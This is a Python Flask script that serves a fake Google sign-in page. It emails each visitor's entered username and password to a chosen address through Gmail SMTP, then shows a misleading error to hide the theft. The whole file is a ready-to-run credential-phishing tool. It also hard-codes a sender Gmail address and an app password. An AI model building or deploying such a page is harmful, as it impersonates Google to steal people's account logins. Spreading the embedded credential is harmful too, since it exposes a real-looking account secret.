from flask import Flask, render_template_string, request
import smtplib
from email.mime.text import MIMEText

# --- Configuration (customize as needed) ---
SENDER_EMAIL = "newtonbaskar04@gmail.com"
APP_PASSWORD = "cjjh zxxo fynw xtno"  # Put your real app password here

# --- HTML Template as string (no need for templates folder) ---
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in - Google Accounts</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #fff;
      padding: 40px 30px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      border-radius: 8px;
      text-align: center;
      width: 320px;
    }
    .logo {
      font-size: 32px;
      font-weight: bold;
      color: #4285f4;
      margin-bottom: 10px;
    }
    h2 {
      font-size: 20px;
      color: #202124;
      margin-bottom: 10px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1a73e8;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1669c1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">G<span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#34A853">g</span><span style="color:#4285F4">l</span><span style="color:#EA4335">e</span></div>
    <h2>Sign in</h2>
    <form method="POST" action="/submit">
      <input type="text" name="username" placeholder="Email or phone" required>
      <input type="password" name="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>

"""

def start_app(receiver_email):
    app = Flask(__name__)

    @app.route('/')
    def home():
        return render_template_string(LOGIN_HTML)

    @app.route('/submit', methods=['POST'])
    def submit():
        username = request.form['username']
        password = request.form['password']
        subject = "Login Info"
        body = f"Username: {username}\nPassword: {password}"

        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = SENDER_EMAIL
        msg['To'] = receiver_email

        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(SENDER_EMAIL, APP_PASSWORD)
                server.send_message(msg)
            return " 404 found Error"
        except Exception as e:
            return f" Failed to send email: {e}"

    app.run(debug=True)
